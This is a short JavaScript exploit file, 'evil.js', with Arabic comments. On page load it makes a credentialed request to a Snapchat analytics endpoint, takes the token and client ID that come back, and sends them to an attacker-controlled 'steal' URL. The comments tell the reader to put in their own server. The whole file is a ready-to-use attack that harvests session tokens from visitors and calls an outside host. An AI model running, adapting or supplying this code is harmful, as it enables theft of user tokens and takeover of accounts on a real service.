// evil.js
document.addEventListener('DOMContentLoaded', function() {
    // إرسال طلب إلى endpoint المعرض للثغرة
    fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
        method: 'POST',
        credentials: 'include'  // إرسال credentials (cookies) مع الطلب
    })
    .then(response => response.json())
    .then(data => {
        // تسريب الـ token إلى سيرفر المهاجم
        const token = data.token;
        const cid = data.cid;
        
        // إرسال الـ token و الـ CID إلى سيرفر المهاجم (استبدل your-server.com بسيرفرك)
        fetch('https://your-server.com/steal?token=' + token + '&cid=' + cid, {
            method: 'GET',
            mode: 'no-cors'  // لتجنب مشاكل CORS عند الإرسال إلى سيرفر خارجي
        })
        .then(() => {
            console.log('Token stolen successfully: ' + token);
        })
        .catch(error => {
            console.error('Error sending token to attacker server:', error);
        });
    })
    .catch(error => {
        console.error('Error fetching token from Snapchat API:', error);
    });
});
